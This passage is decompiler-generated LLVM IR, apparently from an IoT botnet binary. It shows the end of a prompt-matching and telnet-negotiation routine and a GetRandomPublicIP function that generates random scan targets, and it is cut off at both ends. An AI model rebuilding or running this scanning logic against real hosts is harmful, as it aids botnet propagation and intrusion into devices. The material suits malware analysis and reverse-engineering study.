  br i1 %v2_10003164, label %dec_label_pc_10003158.backedge.dec_label_pc_1000316c_crit_edge, label %dec_label_pc_1000319c

dec_label_pc_10003158.backedge.dec_label_pc_1000316c_crit_edge: ; preds = %dec_label_pc_10003158.backedge
  %v3_1000316c.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_1000316c

dec_label_pc_10003138:                            ; preds = %dec_label_pc_1000312c
  %v1_1000313c = call i32 @matchPrompt(i32 %arg6)
  %v3_10003144 = icmp eq i32 %v1_1000313c, 0
  br i1 %v3_10003144, label %dec_label_pc_10003158.backedge, label %dec_label_pc_10003190

dec_label_pc_1000316c:                            ; preds = %dec_label_pc_10003158.backedge.dec_label_pc_1000316c_crit_edge, %dec_label_pc_1000316c.lr.ph
  %v3_1000316c = phi i32 [ %arg4, %dec_label_pc_1000316c.lr.ph ], [ %v3_1000316c.pre, %dec_label_pc_10003158.backedge.dec_label_pc_1000316c_crit_edge ]
  %stack_var_-196.09 = phi i32 [ %v0_10002f1c, %dec_label_pc_1000316c.lr.ph ], [ %stack_var_-196.0.be, %dec_label_pc_10003158.backedge.dec_label_pc_1000316c_crit_edge ]
  %v2_10003170 = icmp sgt i32 %v3_1000316c, 0
  br i1 %v2_10003170, label %dec_label_pc_10002f54, label %dec_label_pc_10003178

dec_label_pc_10003178:                            ; preds = %dec_label_pc_1000316c
  br i1 %v2_1000317c, label %dec_label_pc_10002f54, label %dec_label_pc_1000319c

dec_label_pc_10003190:                            ; preds = %dec_label_pc_10003114, %dec_label_pc_10003138
  br label %dec_label_pc_100031a4

dec_label_pc_1000319c:                            ; preds = %dec_label_pc_10003158.backedge, %dec_label_pc_10003178, %dec_label_pc_10002f98, %entry
  br label %dec_label_pc_100031a4

dec_label_pc_100031a4:                            ; preds = %dec_label_pc_10003190, %dec_label_pc_10003108, %dec_label_pc_100030d0, %dec_label_pc_10003060, %dec_label_pc_1000319c
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_1000319c ], [ 1, %dec_label_pc_10003190 ], [ 0, %dec_label_pc_10003060 ], [ 0, %dec_label_pc_100030d0 ], [ 0, %dec_label_pc_10003108 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %stack_var_-196.09, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.be, { 1, 0 }
  uselistorder i32 %v2_10003074, { 1, 2, 3, 0 }
  uselistorder i32 %v1_10002f84, { 1, 0 }
  uselistorder i32 %v2_10002f54, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_100031a4, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000319c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10003190, { 1, 0 }
  uselistorder label %dec_label_pc_10003158.backedge, { 1, 0, 2 }
}

define i32 @GetRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  store i8 0, i8* bitcast (i32* @global_var_100287e9.52 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_100287ea.53 to i8*), align 4
  store i8 0, i8* @global_var_100287eb.54, align 1
  store i8 0, i8* @global_var_100287ec.55, align 1
  store i32 268448284, i32* @lr, align 4
  %v0_10003218 = call i32 @random()
  %v2_10003238 = srem i32 %v0_10003218, 255
  %v1_10003260 = trunc i32 %v2_10003238 to i8
  store i8 %v1_10003260, i8* bitcast (i32* @global_var_100287e9.52 to i8*), align 4
  store i32 268448360, i32* @lr, align 4
  %v0_10003264 = call i32 @random()
  %v2_10003284 = srem i32 %v0_10003264, 255
  %v1_100032ac = trunc i32 %v2_10003284 to i8
  store i8 %v1_100032ac, i8* bitcast (i32* @global_var_100287ea.53 to i8*), align 4
  store i32 268448436, i32* @lr, align 4
  %v0_100032b0 = call i32 @random()
  %v2_100032d0 = srem i32 %v0_100032b0, 255
  %v1_100032f8 = trunc i32 %v2_100032d0 to i8
  store i8 %v1_100032f8, i8* @global_var_100287eb.54, align 1
  store i32 268448512, i32* @lr, align 4
  %v0_100032fc = call i32 @random()
  %v2_1000331c = srem i32 %v0_100032fc, 255
  %v1_10003344 = trunc i32 %v2_1000331c to i8
  store i8 %v1_10003344, i8* @global_var_100287ec.55, align 1
  store i32 268448588, i32* @lr, align 4
  %v0_10003348 = call i32 @random()
  %v2_10003364 = srem i32 %v0_10003348, 208
  %v3_10003378 = icmp eq i32 %v2_10003364, 0
  br i1 %v3_10003378, label %dec_label_pc_10003380, label %dec_label_pc_100033c8

dec_label_pc_10003380:                            ; preds = %entry
  %v2_10003380 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003394 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003394 = zext i8 %v3_10003394 to i32
  %v4_100033c4 = call i32 @szprintf(i32 %v2_10003380, i32 ptrtoint ([12 x i8]* @global_var_10015660.56 to i32), i32 %v4_10003394)
  br label %dec_label_pc_100033c8

dec_label_pc_100033c8:                            ; preds = %entry, %dec_label_pc_10003380
  %v3_100033cc = icmp eq i32 %v2_10003364, 1
  br i1 %v3_100033cc, label %dec_label_pc_100033d4, label %dec_label_pc_1000341c

dec_label_pc_100033d4:                            ; preds = %dec_label_pc_100033c8
  %v2_100033d4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100033e8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100033e8 = zext i8 %v3_100033e8 to i32
  %v4_10003418 = call i32 @szprintf(i32 %v2_100033d4, i32 ptrtoint ([14 x i8]* @global_var_1001566c.57 to i32), i32 %v4_100033e8)
  br label %dec_label_pc_1000341c

dec_label_pc_1000341c:                            ; preds = %dec_label_pc_100033c8, %dec_label_pc_100033d4
  %v3_10003420 = icmp eq i32 %v2_10003364, 2
  br i1 %v3_10003420, label %dec_label_pc_10003428, label %dec_label_pc_10003470

dec_label_pc_10003428:                            ; preds = %dec_label_pc_1000341c
  %v2_10003428 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000343c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000343c = zext i8 %v3_1000343c to i32
  %v4_1000346c = call i32 @szprintf(i32 %v2_10003428, i32 ptrtoint ([11 x i8]* @global_var_1001567c.58 to i32), i32 %v4_1000343c)
  br label %dec_label_pc_10003470

dec_label_pc_10003470:                            ; preds = %dec_label_pc_1000341c, %dec_label_pc_10003428
  %v3_10003474 = icmp eq i32 %v2_10003364, 3
  br i1 %v3_10003474, label %dec_label_pc_1000347c, label %dec_label_pc_100034c4

dec_label_pc_1000347c:                            ; preds = %dec_label_pc_10003470
  %v2_1000347c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003490 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003490 = zext i8 %v3_10003490 to i32
  %v4_100034c0 = call i32 @szprintf(i32 %v2_1000347c, i32 ptrtoint ([13 x i8]* @global_var_10015688.59 to i32), i32 %v4_10003490)
  br label %dec_label_pc_100034c4

dec_label_pc_100034c4:                            ; preds = %dec_label_pc_10003470, %dec_label_pc_1000347c
  %v3_100034c8 = icmp eq i32 %v2_10003364, 4
  br i1 %v3_100034c8, label %dec_label_pc_100034d0, label %dec_label_pc_10003518

dec_label_pc_100034d0:                            ; preds = %dec_label_pc_100034c4
  %v2_100034d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100034e4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100034e4 = zext i8 %v3_100034e4 to i32
  %v4_10003514 = call i32 @szprintf(i32 %v2_100034d0, i32 ptrtoint ([11 x i8]* @global_var_10015698.60 to i32), i32 %v4_100034e4)
  br label %dec_label_pc_10003518

dec_label_pc_10003518:                            ; preds = %dec_label_pc_100034c4, %dec_label_pc_100034d0
  %v3_1000351c = icmp eq i32 %v2_10003364, 5
  br i1 %v3_1000351c, label %dec_label_pc_10003524, label %dec_label_pc_1000356c

dec_label_pc_10003524:                            ; preds = %dec_label_pc_10003518
  %v2_10003524 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003538 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003538 = zext i8 %v3_10003538 to i32
  %v4_10003568 = call i32 @szprintf(i32 %v2_10003524, i32 ptrtoint ([13 x i8]* @global_var_100156a4.61 to i32), i32 %v4_10003538)
  br label %dec_label_pc_1000356c

dec_label_pc_1000356c:                            ; preds = %dec_label_pc_10003518, %dec_label_pc_10003524
  %v3_10003570 = icmp eq i32 %v2_10003364, 6
  br i1 %v3_10003570, label %dec_label_pc_10003578, label %dec_label_pc_100035c0

dec_label_pc_10003578:                            ; preds = %dec_label_pc_1000356c
  %v2_10003578 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000358c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000358c = zext i8 %v3_1000358c to i32
  %v4_100035bc = call i32 @szprintf(i32 %v2_10003578, i32 ptrtoint ([12 x i8]* @global_var_100156b4.62 to i32), i32 %v4_1000358c)
  br label %dec_label_pc_100035c0

dec_label_pc_100035c0:                            ; preds = %dec_label_pc_1000356c, %dec_label_pc_10003578
  %v3_100035c4 = icmp eq i32 %v2_10003364, 7
  br i1 %v3_100035c4, label %dec_label_pc_100035cc, label %dec_label_pc_10003614

dec_label_pc_100035cc:                            ; preds = %dec_label_pc_100035c0
  %v2_100035cc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100035e0 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100035e0 = zext i8 %v3_100035e0 to i32
  %v4_10003610 = call i32 @szprintf(i32 %v2_100035cc, i32 ptrtoint ([13 x i8]* @global_var_100156c0.63 to i32), i32 %v4_100035e0)
  br label %dec_label_pc_10003614

dec_label_pc_10003614:                            ; preds = %dec_label_pc_100035c0, %dec_label_pc_100035cc
  %v3_10003618 = icmp eq i32 %v2_10003364, 8
  br i1 %v3_10003618, label %dec_label_pc_10003620, label %dec_label_pc_10003668

dec_label_pc_10003620:                            ; preds = %dec_label_pc_10003614
  %v2_10003620 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003634 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003634 = zext i8 %v3_10003634 to i32
  %v4_10003664 = call i32 @szprintf(i32 %v2_10003620, i32 ptrtoint ([13 x i8]* @global_var_100156d0.64 to i32), i32 %v4_10003634)
  br label %dec_label_pc_10003668

dec_label_pc_10003668:                            ; preds = %dec_label_pc_10003614, %dec_label_pc_10003620
  %v3_1000366c = icmp eq i32 %v2_10003364, 9
  br i1 %v3_1000366c, label %dec_label_pc_10003674, label %dec_label_pc_100036bc

dec_label_pc_10003674:                            ; preds = %dec_label_pc_10003668
  %v2_10003674 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003688 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003688 = zext i8 %v3_10003688 to i32
  %v4_100036b8 = call i32 @szprintf(i32 %v2_10003674, i32 ptrtoint ([13 x i8]* @global_var_100156e0.65 to i32), i32 %v4_10003688)
  br label %dec_label_pc_100036bc

dec_label_pc_100036bc:                            ; preds = %dec_label_pc_10003668, %dec_label_pc_10003674
  %v3_100036c0 = icmp eq i32 %v2_10003364, 10
  br i1 %v3_100036c0, label %dec_label_pc_100036c8, label %dec_label_pc_10003710

dec_label_pc_100036c8:                            ; preds = %dec_label_pc_100036bc
  %v2_100036c8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100036dc = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100036dc = zext i8 %v3_100036dc to i32
  %v4_1000370c = call i32 @szprintf(i32 %v2_100036c8, i32 ptrtoint ([14 x i8]* @global_var_100156f0.66 to i32), i32 %v4_100036dc)
  br label %dec_label_pc_10003710

dec_label_pc_10003710:                            ; preds = %dec_label_pc_100036bc, %dec_label_pc_100036c8
  %v3_10003714 = icmp eq i32 %v2_10003364, 11
  br i1 %v3_10003714, label %dec_label_pc_1000371c, label %dec_label_pc_10003764

dec_label_pc_1000371c:                            ; preds = %dec_label_pc_10003710
  %v2_1000371c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003730 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003730 = zext i8 %v3_10003730 to i32
  %v4_10003760 = call i32 @szprintf(i32 %v2_1000371c, i32 ptrtoint ([11 x i8]* @global_var_10015700.67 to i32), i32 %v4_10003730)
  br label %dec_label_pc_10003764

dec_label_pc_10003764:                            ; preds = %dec_label_pc_10003710, %dec_label_pc_1000371c
  %v3_10003768 = icmp eq i32 %v2_10003364, 12
  br i1 %v3_10003768, label %dec_label_pc_10003770, label %dec_label_pc_100037b8

dec_label_pc_10003770:                            ; preds = %dec_label_pc_10003764
  %v2_10003770 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003784 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003784 = zext i8 %v3_10003784 to i32
  %v4_100037b4 = call i32 @szprintf(i32 %v2_10003770, i32 ptrtoint ([13 x i8]* @global_var_1001570c.68 to i32), i32 %v4_10003784)
  br label %dec_label_pc_100037b8

dec_label_pc_100037b8:                            ; preds = %dec_label_pc_10003764, %dec_label_pc_10003770
  %v3_100037bc = icmp eq i32 %v2_10003364, 13
  br i1 %v3_100037bc, label %dec_label_pc_100037c4, label %dec_label_pc_1000380c

dec_label_pc_100037c4:                            ; preds = %dec_label_pc_100037b8
  %v2_100037c4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100037d8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100037d8 = zext i8 %v3_100037d8 to i32
  %v4_10003808 = call i32 @szprintf(i32 %v2_100037c4, i32 ptrtoint ([13 x i8]* @global_var_1001571c.69 to i32), i32 %v4_100037d8)
  br label %dec_label_pc_1000380c

dec_label_pc_1000380c:                            ; preds = %dec_label_pc_100037b8, %dec_label_pc_100037c4
  %v3_10003810 = icmp eq i32 %v2_10003364, 14
  br i1 %v3_10003810, label %dec_label_pc_10003818, label %dec_label_pc_10003860

dec_label_pc_10003818:                            ; preds = %dec_label_pc_1000380c
  %v2_10003818 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000382c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000382c = zext i8 %v3_1000382c to i32
  %v4_1000385c = call i32 @szprintf(i32 %v2_10003818, i32 ptrtoint ([13 x i8]* @global_var_1001572c.70 to i32), i32 %v4_1000382c)
  br label %dec_label_pc_10003860

dec_label_pc_10003860:                            ; preds = %dec_label_pc_1000380c, %dec_label_pc_10003818
  %v3_10003864 = icmp eq i32 %v2_10003364, 15
  br i1 %v3_10003864, label %dec_label_pc_1000386c, label %dec_label_pc_100038b4

dec_label_pc_1000386c:                            ; preds = %dec_label_pc_10003860
  %v2_1000386c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003880 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003880 = zext i8 %v3_10003880 to i32
  %v4_100038b0 = call i32 @szprintf(i32 %v2_1000386c, i32 ptrtoint ([13 x i8]* @global_var_1001573c.71 to i32), i32 %v4_10003880)
  br label %dec_label_pc_100038b4

dec_label_pc_100038b4:                            ; preds = %dec_label_pc_10003860, %dec_label_pc_1000386c
  %v3_100038b8 = icmp eq i32 %v2_10003364, 16
  br i1 %v3_100038b8, label %dec_label_pc_100038c0, label %dec_label_pc_10003908

dec_label_pc_100038c0:                            ; preds = %dec_label_pc_100038b4
  %v2_100038c0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100038d4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100038d4 = zext i8 %v3_100038d4 to i32
  %v4_10003904 = call i32 @szprintf(i32 %v2_100038c0, i32 ptrtoint ([13 x i8]* @global_var_1001574c.72 to i32), i32 %v4_100038d4)
  br label %dec_label_pc_10003908

dec_label_pc_10003908:                            ; preds = %dec_label_pc_100038b4, %dec_label_pc_100038c0
  %v3_1000390c = icmp eq i32 %v2_10003364, 17
  br i1 %v3_1000390c, label %dec_label_pc_10003914, label %dec_label_pc_1000395c

dec_label_pc_10003914:                            ; preds = %dec_label_pc_10003908
  %v2_10003914 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003928 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003928 = zext i8 %v3_10003928 to i32
  %v4_10003958 = call i32 @szprintf(i32 %v2_10003914, i32 ptrtoint ([13 x i8]* @global_var_1001575c.73 to i32), i32 %v4_10003928)
  br label %dec_label_pc_1000395c

dec_label_pc_1000395c:                            ; preds = %dec_label_pc_10003908, %dec_label_pc_10003914
  %v3_10003960 = icmp eq i32 %v2_10003364, 18
  br i1 %v3_10003960, label %dec_label_pc_10003968, label %dec_label_pc_100039b0

dec_label_pc_10003968:                            ; preds = %dec_label_pc_1000395c
  %v2_10003968 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000397c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000397c = zext i8 %v3_1000397c to i32
  %v4_100039ac = call i32 @szprintf(i32 %v2_10003968, i32 ptrtoint ([13 x i8]* @global_var_1001576c.74 to i32), i32 %v4_1000397c)
  br label %dec_label_pc_100039b0

dec_label_pc_100039b0:                            ; preds = %dec_label_pc_1000395c, %dec_label_pc_10003968
  %v3_100039b4 = icmp eq i32 %v2_10003364, 19
  br i1 %v3_100039b4, label %dec_label_pc_100039bc, label %dec_label_pc_10003a04

dec_label_pc_100039bc:                            ; preds = %dec_label_pc_100039b0
  %v2_100039bc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100039d0 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100039d0 = zext i8 %v3_100039d0 to i32
  %v4_10003a00 = call i32 @szprintf(i32 %v2_100039bc, i32 ptrtoint ([11 x i8]* @global_var_1001577c.75 to i32), i32 %v4_100039d0)
  br label %dec_label_pc_10003a04

dec_label_pc_10003a04:                            ; preds = %dec_label_pc_100039b0, %dec_label_pc_100039bc
  %v3_10003a08 = icmp eq i32 %v2_10003364, 20
  br i1 %v3_10003a08, label %dec_label_pc_10003a10, label %dec_label_pc_10003a58

dec_label_pc_10003a10:                            ; preds = %dec_label_pc_10003a04
  %v2_10003a10 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003a24 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003a24 = zext i8 %v3_10003a24 to i32
  %v4_10003a54 = call i32 @szprintf(i32 %v2_10003a10, i32 ptrtoint ([12 x i8]* @global_var_10015788.76 to i32), i32 %v4_10003a24)
  br label %dec_label_pc_10003a58

dec_label_pc_10003a58:                            ; preds = %dec_label_pc_10003a04, %dec_label_pc_10003a10
  %v3_10003a5c = icmp eq i32 %v2_10003364, 21
  br i1 %v3_10003a5c, label %dec_label_pc_10003a64, label %dec_label_pc_10003aac

dec_label_pc_10003a64:                            ; preds = %dec_label_pc_10003a58
  %v2_10003a64 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003a78 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003a78 = zext i8 %v3_10003a78 to i32
  %v4_10003aa8 = call i32 @szprintf(i32 %v2_10003a64, i32 ptrtoint ([13 x i8]* @global_var_10015794.77 to i32), i32 %v4_10003a78)
  br label %dec_label_pc_10003aac

dec_label_pc_10003aac:                            ; preds = %dec_label_pc_10003a58, %dec_label_pc_10003a64
  %v3_10003ab0 = icmp eq i32 %v2_10003364, 22
  br i1 %v3_10003ab0, label %dec_label_pc_10003ab8, label %dec_label_pc_10003b00

dec_label_pc_10003ab8:                            ; preds = %dec_label_pc_10003aac
  %v2_10003ab8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003acc = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003acc = zext i8 %v3_10003acc to i32
  %v4_10003afc = call i32 @szprintf(i32 %v2_10003ab8, i32 ptrtoint ([11 x i8]* @global_var_100157a4.78 to i32), i32 %v4_10003acc)
  br label %dec_label_pc_10003b00

dec_label_pc_10003b00:                            ; preds = %dec_label_pc_10003aac, %dec_label_pc_10003ab8
  %v3_10003b04 = icmp eq i32 %v2_10003364, 23
  br i1 %v3_10003b04, label %dec_label_pc_10003b0c, label %dec_label_pc_10003b54

dec_label_pc_10003b0c:                            ; preds = %dec_label_pc_10003b00
  %v2_10003b0c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003b20 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003b20 = zext i8 %v3_10003b20 to i32
  %v4_10003b50 = call i32 @szprintf(i32 %v2_10003b0c, i32 ptrtoint ([11 x i8]* @global_var_100157b0.79 to i32), i32 %v4_10003b20)
  br label %dec_label_pc_10003b54

dec_label_pc_10003b54:                            ; preds = %dec_label_pc_10003b00, %dec_label_pc_10003b0c
  %v3_10003b58 = icmp eq i32 %v2_10003364, 24
  br i1 %v3_10003b58, label %dec_label_pc_10003b60, label %dec_label_pc_10003ba8

dec_label_pc_10003b60:                            ; preds = %dec_label_pc_10003b54
  %v2_10003b60 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003b74 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003b74 = zext i8 %v3_10003b74 to i32
  %v4_10003ba4 = call i32 @szprintf(i32 %v2_10003b60, i32 ptrtoint ([12 x i8]* @global_var_100157bc.80 to i32), i32 %v4_10003b74)
  br label %dec_label_pc_10003ba8

dec_label_pc_10003ba8:                            ; preds = %dec_label_pc_10003b54, %dec_label_pc_10003b60
  %v3_10003bac = icmp eq i32 %v2_10003364, 25
  br i1 %v3_10003bac, label %dec_label_pc_10003bb4, label %dec_label_pc_10003bfc

dec_label_pc_10003bb4:                            ; preds = %dec_label_pc_10003ba8
  %v2_10003bb4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003bc8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003bc8 = zext i8 %v3_10003bc8 to i32
  %v4_10003bf8 = call i32 @szprintf(i32 %v2_10003bb4, i32 ptrtoint ([12 x i8]* @global_var_100157c8.81 to i32), i32 %v4_10003bc8)
  br label %dec_label_pc_10003bfc

dec_label_pc_10003bfc:                            ; preds = %dec_label_pc_10003ba8, %dec_label_pc_10003bb4
  %v3_10003c00 = icmp eq i32 %v2_10003364, 26
  br i1 %v3_10003c00, label %dec_label_pc_10003c08, label %dec_label_pc_10003c50

dec_label_pc_10003c08:                            ; preds = %dec_label_pc_10003bfc
  %v2_10003c08 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003c1c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003c1c = zext i8 %v3_10003c1c to i32
  %v4_10003c4c = call i32 @szprintf(i32 %v2_10003c08, i32 ptrtoint ([12 x i8]* @global_var_100157d4.82 to i32), i32 %v4_10003c1c)
  br label %dec_label_pc_10003c50

dec_label_pc_10003c50:                            ; preds = %dec_label_pc_10003bfc, %dec_label_pc_10003c08
  %v3_10003c54 = icmp eq i32 %v2_10003364, 27
  br i1 %v3_10003c54, label %dec_label_pc_10003c5c, label %dec_label_pc_10003ca4

dec_label_pc_10003c5c:                            ; preds = %dec_label_pc_10003c50
  %v2_10003c5c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003c70 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003c70 = zext i8 %v3_10003c70 to i32
  %v4_10003ca0 = call i32 @szprintf(i32 %v2_10003c5c, i32 ptrtoint ([13 x i8]* @global_var_100157e0.83 to i32), i32 %v4_10003c70)
  br label %dec_label_pc_10003ca4

dec_label_pc_10003ca4:                            ; preds = %dec_label_pc_10003c50, %dec_label_pc_10003c5c
  %v3_10003ca8 = icmp eq i32 %v2_10003364, 28
  br i1 %v3_10003ca8, label %dec_label_pc_10003cb0, label %dec_label_pc_10003cf8

dec_label_pc_10003cb0:                            ; preds = %dec_label_pc_10003ca4
  %v2_10003cb0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003cc4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003cc4 = zext i8 %v3_10003cc4 to i32
  %v4_10003cf4 = call i32 @szprintf(i32 %v2_10003cb0, i32 ptrtoint ([13 x i8]* @global_var_100157f0.84 to i32), i32 %v4_10003cc4)
  br label %dec_label_pc_10003cf8

dec_label_pc_10003cf8:                            ; preds = %dec_label_pc_10003ca4, %dec_label_pc_10003cb0
  %v3_10003cfc = icmp eq i32 %v2_10003364, 29
  br i1 %v3_10003cfc, label %dec_label_pc_10003d04, label %dec_label_pc_10003d4c

dec_label_pc_10003d04:                            ; preds = %dec_label_pc_10003cf8
  %v2_10003d04 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003d18 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003d18 = zext i8 %v3_10003d18 to i32
  %v4_10003d48 = call i32 @szprintf(i32 %v2_10003d04, i32 ptrtoint ([12 x i8]* @global_var_10015800.85 to i32), i32 %v4_10003d18)
  br label %dec_label_pc_10003d4c

dec_label_pc_10003d4c:                            ; preds = %dec_label_pc_10003cf8, %dec_label_pc_10003d04
  %v3_10003d50 = icmp eq i32 %v2_10003364, 30
  br i1 %v3_10003d50, label %dec_label_pc_10003d58, label %dec_label_pc_10003da0

dec_label_pc_10003d58:                            ; preds = %dec_label_pc_10003d4c
  %v2_10003d58 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003d6c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003d6c = zext i8 %v3_10003d6c to i32
  %v4_10003d9c = call i32 @szprintf(i32 %v2_10003d58, i32 ptrtoint ([13 x i8]* @global_var_1001580c.86 to i32), i32 %v4_10003d6c)
  br label %dec_label_pc_10003da0

dec_label_pc_10003da0:                            ; preds = %dec_label_pc_10003d4c, %dec_label_pc_10003d58
  %v3_10003da4 = icmp eq i32 %v2_10003364, 31
  br i1 %v3_10003da4, label %dec_label_pc_10003dac, label %dec_label_pc_10003df4

dec_label_pc_10003dac:                            ; preds = %dec_label_pc_10003da0
  %v2_10003dac = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003dc0 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003dc0 = zext i8 %v3_10003dc0 to i32
  %v4_10003df0 = call i32 @szprintf(i32 %v2_10003dac, i32 ptrtoint ([12 x i8]* @global_var_1001581c.87 to i32), i32 %v4_10003dc0)
  br label %dec_label_pc_10003df4

dec_label_pc_10003df4:                            ; preds = %dec_label_pc_10003da0, %dec_label_pc_10003dac
  %v3_10003df8 = icmp eq i32 %v2_10003364, 32
  br i1 %v3_10003df8, label %dec_label_pc_10003e00, label %dec_label_pc_10003e48

dec_label_pc_10003e00:                            ; preds = %dec_label_pc_10003df4
  %v2_10003e00 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003e14 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003e14 = zext i8 %v3_10003e14 to i32
  %v4_10003e44 = call i32 @szprintf(i32 %v2_10003e00, i32 ptrtoint ([11 x i8]* @global_var_10015828.88 to i32), i32 %v4_10003e14)
  br label %dec_label_pc_10003e48

dec_label_pc_10003e48:                            ; preds = %dec_label_pc_10003df4, %dec_label_pc_10003e00
  %v3_10003e4c = icmp eq i32 %v2_10003364, 33
  br i1 %v3_10003e4c, label %dec_label_pc_10003e54, label %dec_label_pc_10003e9c

dec_label_pc_10003e54:                            ; preds = %dec_label_pc_10003e48
  %v2_10003e54 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003e68 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003e68 = zext i8 %v3_10003e68 to i32
  %v4_10003e98 = call i32 @szprintf(i32 %v2_10003e54, i32 ptrtoint ([12 x i8]* @global_var_10015834.89 to i32), i32 %v4_10003e68)
  br label %dec_label_pc_10003e9c

dec_label_pc_10003e9c:                            ; preds = %dec_label_pc_10003e48, %dec_label_pc_10003e54
  %v3_10003ea0 = icmp eq i32 %v2_10003364, 34
  br i1 %v3_10003ea0, label %dec_label_pc_10003ea8, label %dec_label_pc_10003ef0

dec_label_pc_10003ea8:                            ; preds = %dec_label_pc_10003e9c
  %v2_10003ea8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003ebc = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003ebc = zext i8 %v3_10003ebc to i32
  %v4_10003eec = call i32 @szprintf(i32 %v2_10003ea8, i32 ptrtoint ([12 x i8]* @global_var_10015840.90 to i32), i32 %v4_10003ebc)
  br label %dec_label_pc_10003ef0

dec_label_pc_10003ef0:                            ; preds = %dec_label_pc_10003e9c, %dec_label_pc_10003ea8
  %v3_10003ef4 = icmp eq i32 %v2_10003364, 35
  br i1 %v3_10003ef4, label %dec_label_pc_10003efc, label %dec_label_pc_10003f44

dec_label_pc_10003efc:                            ; preds = %dec_label_pc_10003ef0
  %v2_10003efc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003f10 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10003f10 = zext i8 %v3_10003f10 to i32
  %v4_10003f40 = call i32 @szprintf(i32 %v2_10003efc, i32 ptrtoint ([12 x i8]* @global_var_1001584c.91 to i32), i32 %v4_10003f10)
  br label %dec_label_pc_10003f44

dec_label_pc_10003f44:                            ; preds = %dec_label_pc_10003ef0, %dec_label_pc_10003efc
  %v3_10003f48 = icmp eq i32 %v2_10003364, 36
  br i1 %v3_10003f48, label %dec_label_pc_10003f50, label %dec_label_pc_10003f98

dec_label_pc_10003f50:                            ; preds = %dec_label_pc_10003f44
  %v2_10003f50 = ptrtoint i32* %stack_var_-52 to i32
